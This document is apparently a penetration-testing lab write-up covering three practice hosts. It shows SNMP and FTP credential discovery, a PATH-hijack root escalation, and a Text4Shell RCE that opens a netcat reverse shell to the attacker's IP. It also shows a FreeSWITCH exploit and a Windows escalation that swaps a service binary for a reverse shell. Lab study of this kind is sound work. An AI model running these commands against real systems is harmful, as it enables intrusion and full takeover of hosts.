Did not find 'IANAsmfRssaIdTC' in module #-1 (/usr/share/snmp/mibs/ietf/SMF-MIB)
Cannot find module (IANAPowerStateSet-MIB): At line 20 in /usr/share/snmp/mibs/ietf/ENERGY-OBJECT-MIB
Did not find 'PowerStateSet' in module #-1 (/usr/share/snmp/mibs/ietf/ENERGY-OBJECT-MIB)
Cannot find module (IANA-OLSRv2-LINK-METRIC-TYPE-MIB): At line 26 in /usr/share/snmp/mibs/ietf/OLSRv2-MIB
Did not find 'IANAolsrv2LinkMetricTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/OLSRv2-MIB)
Cannot find module (IANA-ENERGY-RELATION-MIB): At line 22 in /usr/share/snmp/mibs/ietf/ENERGY-OBJECT-CONTEXT-MIB
Did not find 'IANAEnergyRelationship' in module #-1 (/usr/share/snmp/mibs/ietf/ENERGY-OBJECT-CONTEXT-MIB)
Cannot find module (IANA-BFD-TC-STD-MIB): At line 30 in /usr/share/snmp/mibs/ietf/BFD-STD-MIB
Did not find 'IANAbfdDiagTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessOperModeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessStateTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessAuthenticationTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessAuthenticationKeyTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value

```

### FTP 21 -- Scans

Base on the snmp to get the account of `kiero`:`kiero` to login the ftp , and found the id\_rsa to login in ssh.

```
└─# ftp 192.168.228.149
Connected to 192.168.228.149.
220 (vsFTPd 3.0.3)
Name (192.168.228.149:root): kiero
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10091|)
150 Here comes the directory listing.
-rwxr-xr-x    1 114      119          2590 Nov 21  2022 id_rsa
-rw-r--r--    1 114      119           563 Nov 21  2022 id_rsa.pub
-rwxr-xr-x    1 114      119          2635 Nov 21  2022 id_rsa_2
226 Directory send OK.
ftp> 


```

### SSH 22

```
└─# ssh john@192.168.203.149 -i id_rsa 
The authenticity of host '192.168.203.149 (192.168.203.149)' can't be established.
ED25519 key fingerprint is SHA256:+JvlP/LRLQWmEwhQC82TMUUSG5DDU1rjdgracnb/Vrw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '192.168.203.149' (ED25519) to the list of known hosts.
Last login: Tue Nov 22 08:31:27 2022 from 192.168.118.3
john@oscp:~$ 

```

### john to root (Escalation with PATH Variable )

{{< toggle "Tag 🏷️" >}}

{{< tag " Linux-Privilege-Escalation-Path-Variable-Escalation" >}} use the string to check the executable exe and found the strings data for kiero , and the chpasswd is not the /bin/chpasswd , so can create the feak chpasswd in tmp to get the shell

{{< /toggle >}}

`Strings RESET_PASSWD` to read the strings data and found the kiero account

![Pasted image 20251220124705.png](/ob/Pasted%20image%2020251220124705.png)

![Pasted image 20251220124754.png](/ob/Pasted%20image%2020251220124754.png)

After su to the kiero , this program use the chpasswd ; however, it dont specially say it in the `/bin` or how where , so i can change the PATH to let the root go in my shell

![Pasted image 20251220135822.png](/ob/Pasted%20image%2020251220135822.png)

![Pasted image 20251220143256.png](/ob/Pasted%20image%2020251220143256.png)

```
john@oscp:~$ cd /tmp
john@oscp:/tmp$ echo "/bin/bash" > chpasswd
john@oscp:/tmp$ chmod +x chpasswd 
john@oscp:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
john@oscp:/tmp$ export PATH=/tmp:$PATH
john@oscp:/tmp$ ls
```

```
john@oscp:/tmp$ bash
bash-5.0$ cat chpasswd 
cp /bin/bash /tmp && chmod +s /tmp/bash
bash-5.0$ 
```

```
john@oscp:/tmp$ bash -p 
bash-5.0# whoami
root
bash-5.0# 
```

***

# Recon 192.168.109.150

### Information Gathering/NMAP

```shell
─# sudo nmap -sU --top-ports=20 192.168.109.150                                                                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 00:38 HKT
Nmap scan report for 192.168.109.150
Host is up (0.041s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   open|filtered msrpc
137/udp   closed        netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp open|filtered unknown



sudo nmap  192.168.109.150 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 00:39 HKT
Nmap scan report for 192.168.109.150
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.12 seconds

```

# Web Recon 8080 🪲

![Pasted image 20251221004247.png](/ob/Pasted%20image%2020251221004247.png)

the website is created by java of SpringBoot

### WebSite Directory BurteForce

![Pasted image 20251221011107.png](/ob/Pasted%20image%2020251221011107.png)

```
└─# feroxbuster -u http://192.168.109.150:8080
                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.109.150:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        4w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        1w       19c http://192.168.109.150:8080/
200      GET        1l        1w       25c http://192.168.109.150:8080/search
500      GET        1l        3w      105c http://192.168.109.150:8080/error
200      GET        8l       30w      194c http://192.168.109.150:8080/CHANGELOG
400      GET        1l       31w      800c http://192.168.109.150:8080/[
400      GET        1l       31w      800c http://192.168.109.150:8080/plain]
400      GET        1l       31w      800c http://192.168.109.150:8080/]
400      GET        1l       31w      800c http://192.168.109.150:8080/quote]
400      GET        1l       31w      800c http://192.168.109.150:8080/extension]
400      GET        1l       31w      800c http://192.168.109.150:8080/[0-9]
[####################] - 26s    30002/30002   0s      found:10      errors:0      
[####################] - 25s    30000/30000   1203/s  http://192.168.109.150:8080/  
```

### Exploit-CVE

{{< toggle "Tag 🏷️" >}}

{{< tag "CVE-2022-42889" >}} base on the  feroxbuster to find the version and do the RCE\
{{< /toggle >}}

base on the `feroxbuster` to find the version and do the RCE\
![Pasted image 20251221011130.png](/ob/Pasted%20image%2020251221011130.png)

```
Apache Commons Text 1.10.0 - Remote Code Execution
```

google search

![Pasted image 20251221011229.png](/ob/Pasted%20image%2020251221011229.png)

CVE Link : https://github.com/808ale/CVE-2022-42889-Text4Shell-POC , and i do the ping myself to do the POC

![Pasted image 20251221013630.png](/ob/Pasted%20image%2020251221013630.png)

![Pasted image 20251221013932.png](/ob/Pasted%20image%2020251221013932.png)

```shell
uv run text4shell.py -u "http://192.168.109.150:8080/search?query=" -c 'busybox nc 192.168.45.190 500 -e sh' -m 'rce'
Response status code: 200
Response body: {"query":"${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.45.190 500 -e sh')}","result":""}
```

python3 upgrade

```shell
stty raw -echo;fg
[1]  + continued  rlwrap nc -nvlp 500
dev@oscp:/$ export TERM=xterm
export TERM=xterm
dev@oscp:/$ whoami 
whoami 
dev
dev@oscp:/$ 
```

### dev to root(java xdebug Privilege Escalation)

{{< toggle "Tag 🏷️" >}}

{{< tag " Linux-Privilege-Escalation-java-Xdebug" >}} Found the java -Xdebug -Xrunjdwp, read the /opt/stats/App.java to upgrade the root

{{< /toggle >}}

```
ps auxwwwwwwww
```

Found the java -Xdebug -Xrunjdwp, read the /opt/stats/App.java to upgrade the root : reference  https://www.ioactive.com/hacking-java-debug-wire-protocol-or-how/\
![Pasted image 20251223170935.png](/ob/Pasted%20image%2020251223170935.png)

# Recon 192.168.X.151

### ALL Information Gathering/NMAP

```

PORT     STATE SERVICE          VERSION
80/tcp   open  http             Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| ssl-cert: Subject: commonName=OSCP
| Not valid before: 2026-01-07T03:55:43
|_Not valid after:  2026-07-09T03:55:43
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: OSCP
|   DNS_Computer_Name: OSCP
|   Product_Version: 10.0.19041
|_  System_Time: 2026-01-08T06:03:30+00:00
|_ssl-date: 2026-01-08T06:03:35+00:00; 0s from scanner time.
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.00 seconds
```

### Web Recon 80 🪲

![Pasted image 20260108140650.png](/ob/Pasted%20image%2020260108140650.png)

### WebSite Directory BurteForce

```
└─# feroxbuster -u http://192.168.172.151 

                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.172.151/
 🚩  In-Scope Url          │ 192.168.172.151
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      359l     2112w   178556c http://192.168.172.151/iisstart.png]]
200      GET       32l       54w      696c http://192.168.172.151/
[######>-------------] - 9s     10120/30003   18s     found:2       errors:0      
[######>-------------] - 9s     10219/30003   17s     found:2       errors:0      
400      GET        6l       26w      324c http://192.168.172.151/error%1F_log
[####################] - 26s    30003/30003   0s      found:3       errors:0      
[####################] - 26s    30000/30000   1167/s  http://192.168.172.151/          
```

### Unkown Port -- 8021

In the detail , we know that ClueCon ,so we can google it and find the CVE  to do the rce

```
└─# nc -vn 192.168.172.151 8021 
(UNKNOWN) [192.168.172.151] 8021 (zope-ftp) open
Content-Type: auth/request

help
version
?
Content-Type: text/disconnect-notice
Content-Length: 67

Disconnected, goodbye.
See you at ClueCon! http://www.cluecon.com/
```

![Pasted image 20260108141044.png](/ob/Pasted%20image%2020260108141044.png)

i restart the machine as the first time is failed , but after the restart ,it successfully rce , and i also use the https://www.revshells.com/ to the revshell\
![Pasted image 20260108142107.png](/ob/Pasted%20image%2020260108142107.png)

```

# Download PoC
$ searchsploit -m 47799
​
# Rename PoC file
$ mv 47799.txt 47799.py

─# python3 47799.py 192.168.172.151   whoami
Authenticated
Content-Type: api/response
Content-Length: 11

oscp\chris
```

![Pasted image 20260108142704.png](/ob/Pasted%20image%2020260108142704.png)

![Pasted image 20260108142642.png](/ob/Pasted%20image%2020260108142642.png)

### chris to admin

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-Escalation-KiteService" >}} KiteService.exe which i can replace , and i can start or stop to let my revshell of tool gointo my terminal

{{< /toggle >}}

Run the winpeas.exe and search the Services Information and found the KiteService.exe which i can replace , and i can start or stop to let my revshell of tool gointo my terminal

```
�����������������������������������͹ Services Information ������������������������������������

����������͹ Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    FreeSWITCH(FreeSWITCH - FreeSWITCH Multi Protocol Switch)["C:\Program Files\FreeSWITCH\FreeSwitchConsole.exe"  -service ] - Auto - Running
    File Permissions: chris [Allow: AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\FreeSWITCH (chris [Allow: AllAccess])
    FreeSWITCH service control
   =================================================================================================                                                                                                                                

    KiteService(KiteService)[C:\program files\Kite\KiteService.exe] - Auto - Running - isDotNet - No quotes and Space detected
    File Permissions: chris [Allow: WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\program files\Kite (chris [Allow: WriteData/CreateFiles])
   =================================================================================================

    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
   =================================================================================================                                                                                                                                

    VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Running
    Alias Manager and Ticket Service
   =================================================================================================                                                                                                                                

    vm3dservice(VMware, Inc. - VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Auto - Running
    Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================                                                                                                                                

    VMTools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Running
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================                                                                                                                                


����������͹ Modifiable Services
� Check if you can modify any service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)
```

```
C:\Program Files\Kite>icacls KiteService.exe
icacls KiteService.exe
KiteService.exe OSCP\chris:(I)(M)
                NT AUTHORITY\SYSTEM:(I)(F)
                BUILTIN\Administrators:(I)(F)
                BUILTIN\Users:(I)(RX)
                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files



```

```
C:\Program Files\Kite>ren KiteService.exe KiteService.exe.bak
ren KiteService.exe KiteService.exe.bak
```

```
C:\Program Files\Kite>copy \programdata\rev80.exe KiteService.exe
copy \programdata\rev80.exe KiteService.exe
        1 file(s) copied.
```

```
C:\Program Files\Kite>sc qc "KiteService"
sc qc "KiteService"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: KiteService
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\program files\Kite\KiteService.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : KiteService
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```

```
C:\Program Files\Kite>sc stop "KiteService"
sc stop "KiteService"

SERVICE_NAME: KiteService 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Program Files\Kite>sc start "KiteService"
sc start "KiteService"
```

```
C:\Windows\system32>whoami 
whoami 
nt authority\system
```
